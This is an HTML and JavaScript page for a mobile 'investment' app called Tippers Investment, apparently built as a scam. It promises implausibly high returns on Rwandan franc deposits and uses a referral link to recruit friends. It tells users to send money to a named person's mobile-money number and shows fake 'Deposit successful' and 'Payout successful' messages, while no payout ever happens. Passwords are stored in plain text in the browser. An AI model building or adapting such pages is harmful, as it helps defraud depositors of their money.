<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
.app{
width:390px;
height:95vh;
background:#000;
border-radius:20px;
overflow:hidden;
display:flex;
flex-direction:column;
color:white;
}
.content{
flex:1;
padding:15px;
overflow-y:auto;
}
.title{color:#f59e0b;text-align:center;}
.desc{text-align:center;color:#aaa;font-size:13px;}
input,select{
width:100%;padding:10px;margin-top:8px;border-radius:8px;border:none;background:#0f172a;color:white;
}
button{
width:100%;padding:12px;margin-top:15px;border:none;border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);color:white;cursor:pointer;
}
.row{display:flex;gap:5px;}
.nav{display:flex;justify-content:space-around;background:#020617;padding:10px;}
.nav div{text-align:center;cursor:pointer;font-size:12px;opacity:.8;}
.nav i{display:block;}
.locked{opacity:.3;pointer-events:none;}
.toast{
position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
background:red;color:white;padding:10px;border-radius:8px;display:none;
}
.table{overflow-x:auto;white-space:nowrap;background:#111;padding:10px;border-radius:10px;}
.table div{display:grid;grid-template-columns:160px repeat(7,140px);gap:10px;}
.cell{background:#0f172a;padding:8px;border-radius:6px;text-align:center;font-size:12px;}
.card{background:#111;padding:10px;border-radius:10px;margin-top:10px;}
</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div id="homeIcon" class="locked" onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div id="depIcon" class="locked" onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div id="earnIcon" class="locked" onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
<div id="witIcon" class="locked" onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>
</div>

<div class="toast" id="toast"></div>

<script>

/* STATE */
let users=JSON.parse(localStorage.getItem("users"))||[];
let current=null;
let depositDone=false;

/* REF SYSTEM */
let referrer=null;
const urlParams=new URLSearchParams(window.location.search);
if(urlParams.get("ref")){
referrer=urlParams.get("ref");
localStorage.setItem("referrer",referrer);
}else{
referrer=localStorage.getItem("referrer");
}

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

/* TOAST */
function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* START */
function start(){
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT</h2>
<p class="desc">Start earning now!</p>
<button onclick="register()">NEXT</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="fn" placeholder="First name">
<input id="ln" placeholder="Last name">

<div class="row">
<select><option>+250</option></select>
<input id="phone" placeholder="Phone">
</div>

<input id="email" placeholder="Email">
<input id="pass" placeholder="Password">
<input id="cpass" placeholder="Confirm password">

<button onclick="doRegister()">REGISTER</button>
`;
}

function doRegister(){
if(!fn.value||!ln.value||!phone.value||!email.value||!pass.value||!cpass.value){
toast("Fill all fields");return;
}
if(pass.value!==cpass.value){
toast("Passwords mismatch");return;
}

let newUser={
email:email.value,
pass:pass.value,
ref:referrer
};

users.push(newUser);
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`
<h3 class="title">LOGIN</h3>
<input id="le" placeholder="Email">
<input id="lp" placeholder="Password">
<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){
let user=users.find(u=>u.email==le.value && u.pass==lp.value);
if(!user){toast("Invalid login");return;}

current=user;
nav.style.display="flex";

/* unlock home */
document.querySelectorAll(".nav div").forEach(i=>i.classList.add("locked"));
homeIcon.classList.remove("locked");

showTable();
}

/* TABLE */
function showTable(){
screen.innerHTML=`
<h3 class="title">TIPPERS INVESTMENT PLAN</h3>

<div class="table">
<div>
<div class="cell">INVESTMENT</div>
<div class="cell">DAY</div>
<div class="cell">WEEK</div>
<div class="cell">MONTH</div>
<div class="cell">45D</div>
<div class="cell">3M</div>
<div class="cell">4M</div>
</div>

<div><div class="cell">5,000 RWF</div><div class="cell">110</div><div class="cell">1,050</div><div class="cell">5,400</div><div class="cell">9,225</div><div class="cell">22,500</div><div class="cell">42,000</div></div>
<div><div class="cell">50,000 RWF</div><div class="cell">1,100</div><div class="cell">10,500</div><div class="cell">54,000</div><div class="cell">92,250</div><div class="cell">225,000</div><div class="cell">420,000</div></div>

</div>

<button onclick="shareLink()">INVITE FRIEND</button>
<button onclick="openDeposit()">NEXT</button>
`;
}

/* SHARE */
function shareLink(){
let link=window.location.href+"?ref="+current.email;
navigator.clipboard.writeText(link);
toast("Link copied ✔");
}

/* DEPOSIT */
function openDeposit(){
document.querySelectorAll(".nav div").forEach(i=>i.classList.remove("locked"));

screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>
<input id="amt" placeholder="Amount">
<input id="sender" placeholder="Sender name">
<button onclick="payment()">CONTINUE</button>
`;
}

function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT</h3>
<div class="card">0792459701</div>
<div class="card">BARAKA BOLINGO</div>
<div class="card">*182*1*1*0792459701#</div>
<button onclick="finish()">FINISH</button>
`;
}

function finish(){
depositDone=true;
toast("Deposit successful ✔");
}

/* NAV */
function home(){showTable();}
function deposit(){openDeposit();}

function earn(){
screen.innerHTML=`<h3 class="title">LIVE EARNING</h3>`;
}

function withdraw(){
if(!depositDone){
toast("Deposit first ❌");return;
}
screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>
<input placeholder="Amount">
<input placeholder="MTN number">
<button onclick="toast('Payout successful ✔')">PAYOUT</button>
`;
}

start();

</script>

</body>
</html>
